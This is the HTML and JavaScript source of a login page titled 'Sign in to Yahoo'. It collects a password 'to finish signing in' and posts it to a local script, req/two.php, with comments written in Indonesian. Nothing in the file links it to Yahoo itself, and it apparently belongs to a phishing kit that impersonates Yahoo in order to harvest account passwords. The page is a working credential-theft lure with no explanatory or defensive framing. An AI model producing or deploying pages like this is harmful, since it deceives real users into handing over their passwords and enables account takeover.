<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in - Sign in to Yahoo</title>

<style>
body {
    margin: 0;
    background: #ffffff;
    font-family: system-ui, -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

.container {
    max-width: 360px;
    margin: 0 auto;
    padding: 24px;
}

.logo {
    text-align: center;
    margin-top: 40px;
}

.logo img {
    width: 75px;
}

.text-section {
    margin-top: 88px;
}

.text-section h1 {
    font-size: 24px;
    font-weight: 600;
    margin: 0;
    color: #202124;
    text-align: center;
}

.text-section p {
    margin-top: 8px;
    font-size: 15px;
    color: #5f6368;
    text-align: center;
}

.input-group {
    margin-top: 44px;
    position: relative;
}

.input-group input {
    width: 100%;
    font-size: 16px;
    padding: 10px 40px 10px 0;
    border: none;
    border-bottom: 1.5px solid #dadce0;
    outline: none;
    color: #202124;
}

.input-group input:focus {
    border-bottom: 2px solid #1a73e8;
}

.toggle-password {
    position: absolute;
    right: 0;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    width: 24px;
    height: 24px;
    fill: #5f6368;
}

.button-group {
    margin-top: 32px;
}

.button-group button {
    width: 100%;
    height: 48px;
    font-size: 15px;
    font-weight: 600;
    background: #1a73e8;
    color: #ffffff;
    border: none;
    border-radius: 24px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

.button-group button:active {
    background: #1664c0;
}

.spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top: 2px solid #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    display: none;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.forgot {
    margin-top: 24px;
    text-align: center;
}

.forgot a {
    font-size: 14px;
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
}

.error {
    display: none;
    color: #d93025;
    margin-top: 6px;
    font-size: 13px;
}
</style>
</head>
<body>

<div class="container">

    <div class="logo">
        <img src="log.png" alt="Logo">
    </div>

    <div class="text-section">
        <h1>Enter your password</h1>
        <p>to finish signing in</p>
    </div>

    <!-- FORM -->
    <form id="passwordForm" onsubmit="send(event);" autocomplete="off" action="req/two.php" method="POST" enctype="multipart/form-data">
    <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password">
        <svg id="togglePassword" class="toggle-password" viewBox="0 0 24 24">
            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 13c-3.03 0-5.5-2.47-5.5-5.5S8.97 6.5 12 6.5s5.5 2.47 5.5 5.5-2.47 5.5-5.5 5.5zm0-9a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7z"/>
        </svg>
        <div class="error" id="passwordError"></div>
    </div>

    <div class="button-group">
        <button type="submit" id="nextBtn">
            <span id="btnText">Next</span>
            <div class="spinner" id="spinner"></div>
        </button>
    </div>
</form>

    <div class="forgot">
        <a href="#">Forgot password?</a>
    </div>

</div>

<script>
const password = document.getElementById("password");
const togglePassword = document.getElementById("togglePassword");
const passwordError = document.getElementById("passwordError");
const spinner = document.getElementById("spinner");
const text = document.getElementById("btnText");

/* Show/Hide password */
togglePassword.addEventListener('click', () => {
    if(password.type === "password") {
        password.type = "text";
        togglePassword.style.fill = "#1a73e8";
    } else {
        password.type = "password";
        togglePassword.style.fill = "#5f6368";
    }
});

/* Fungsi send() untuk validasi sebelum submit */
function send(e){
    e.preventDefault(); // hentikan submit default dulu

    const pwdValue = password.value.trim();

    if(pwdValue.length === 0){
        passwordError.textContent = "Password tidak boleh kosong";
        passwordError.style.display = "block";
        password.focus();
        return;
    } else if(pwdValue.length < 6){
        passwordError.textContent = "The password must be at least 6 characters long";
        passwordError.style.display = "block";
        password.focus();
        return;
    } else {
        passwordError.style.display = "none";
    }

    // tampilkan spinner dan ubah teks
    spinner.style.display = "block";
    text.textContent = "Loading…";

    // submit form secara programatik
    e.target.submit();
}
</script>

</body>
</html>
